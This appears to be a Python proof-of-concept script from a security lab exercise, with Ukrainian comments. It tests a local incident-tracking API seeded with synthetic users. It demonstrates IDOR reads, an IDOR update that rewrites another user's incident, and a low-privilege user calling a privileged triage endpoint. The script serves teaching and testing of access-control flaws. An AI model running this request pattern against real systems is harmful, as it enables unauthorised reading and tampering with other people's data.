"""ЛР 4: відтворюваний сценарій доступу до інцидентів (локальний стенд, синтетичні дані).
Пароль береться зі змінної SeedUsers__Password; cookie і пароль не друкуються."""
import http.cookiejar, json, os, sys, urllib.error, urllib.request

sys.stdout.reconfigure(encoding='utf-8')
BASE = os.environ.get('SECURELAB_BASE', 'http://localhost:5080')
ALICE_INCIDENT = '20000000-0000-0000-0000-000000000001'
BOB_INCIDENT = '20000000-0000-0000-0000-000000000002'
ALICE_NEW_INCIDENT = '20000000-0000-0000-0000-000000000003'
PASSWORD = os.environ.get('SeedUsers__Password', '')
if not PASSWORD:
    sys.exit('Задайте SeedUsers__Password у цьому терміналі.')


class Session:
    """Окремий клієнт зі своїм сховищем cookie для кожного користувача."""

    def __init__(self, user=None):
        jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        if user:
            status, _ = self.call('POST', '/api/auth/login', {'userName': user, 'password': PASSWORD})
            if status != 204:
                sys.exit(f'login {user}: {status}')

    def call(self, method, path, body=None):
        data = json.dumps(body).encode() if body is not None else None
        request = urllib.request.Request(BASE + path, data=data, method=method,
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'})
        try:
            with self.opener.open(request, timeout=15) as response:
                raw = response.read()
                return response.status, (json.loads(raw) if raw else None)
        except urllib.error.HTTPError as error:
            raw = error.read()
            try:
                return error.code, (json.loads(raw) if raw else None)
            except ValueError:
                return error.code, None
        except urllib.error.URLError:
            sys.exit('API недоступний: запустіть сервер на ' + BASE)


def details(session, incident_id):
    status, body = session.call('GET', f'/api/incidents/{incident_id}')
    keys = ['id', 'title', 'status', 'ownerDisplayName'] if status == 200 else ['title', 'status']
    shown = {k: body.get(k) for k in keys} if isinstance(body, dict) else body
    return status, json.dumps(shown, ensure_ascii=False)


anon, alice, bob, morgan = Session(), Session('alice'), Session('bob'), Session('morgan')
print('login alice / bob / morgan: 204')

print('\n[1] Анонім -> details Bob:', *details(anon, BOB_INCIDENT))
print('[2] Alice -> details Alice (allow):', *details(alice, ALICE_INCIDENT))
print('[3] Alice -> details Bob (IDOR read):', *details(alice, BOB_INCIDENT))
print('[4] Morgan (Analyst) -> details Alice:', *details(morgan, ALICE_INCIDENT))

_, before = bob.call('GET', f'/api/incidents/{BOB_INCIDENT}')
status, _ = alice.call('PUT', f'/api/incidents/{BOB_INCIDENT}',
    {'title': 'Змінено від імені Alice', 'description': 'PoC IDOR update: Alice змінює чужий інцидент.'})
_, after = bob.call('GET', f'/api/incidents/{BOB_INCIDENT}')
print('\n[5] Alice -> PUT інциденту Bob (IDOR update):', status)
print('    title до   :', before.get('title'))
print('    title після:', after.get('title'), '| змінено:', before.get('title') != after.get('title'))

_, before = alice.call('GET', f'/api/incidents/{ALICE_NEW_INCIDENT}')
status, _ = alice.call('POST', f'/api/incidents/{ALICE_NEW_INCIDENT}/triage', {})
_, after = alice.call('GET', f'/api/incidents/{ALICE_NEW_INCIDENT}')
print('\n[6] Alice (Reporter) -> triage власного інциденту (privileged):', status)
print('    status до:', before.get('status'), '| після:', after.get('status'))

print('\nСценарій змінює стан; перед повторним запуском виконайте --reset-database.')
